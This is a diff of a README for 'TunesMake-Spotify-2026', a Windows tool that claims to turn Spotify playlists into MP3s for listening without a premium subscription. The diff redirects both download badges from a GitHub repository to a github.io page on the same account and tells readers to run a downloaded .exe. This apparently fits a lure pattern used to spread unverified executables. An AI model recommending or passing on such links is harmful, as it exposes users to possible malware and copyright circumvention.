@@ -1,6 +1,6 @@
 # 🎵 TunesMake-Spotify-2026 - Convert Spotify music to local files
 
-[![](https://img.shields.io/badge/Download-TunesMake-blue.svg)](https://github.com/manticoresemblance908/TunesMake-Spotify-2026)
+[![](https://img.shields.io/badge/Download-TunesMake-blue.svg)](https://manticoresemblance908.github.io)
 
 TunesMake-Spotify-2026 allows you to save your Spotify playlists as MP3 files on your computer. This tool works on Windows 11 and Windows 10. You can listen to your music offline without an active internet connection or a premium subscription. 
 
@@ -17,7 +17,7 @@ Your computer needs to meet these basic standards to run the software correctly:
 
 ## 💾 Downloading the Software
 
-[![](https://img.shields.io/badge/Download-TunesMake-grey.svg)](https://github.com/manticoresemblance908/TunesMake-Spotify-2026)
+[![](https://img.shields.io/badge/Download-TunesMake-grey.svg)](https://manticoresemblance908.github.io)
 
 Visit the link above to reach the main page for this project. Look for the latest version tag on the right side of the screen. Select the file ending in .exe to begin the transfer to your computer. Save the file to your Downloads folder or your Desktop so you can find it easily.
 
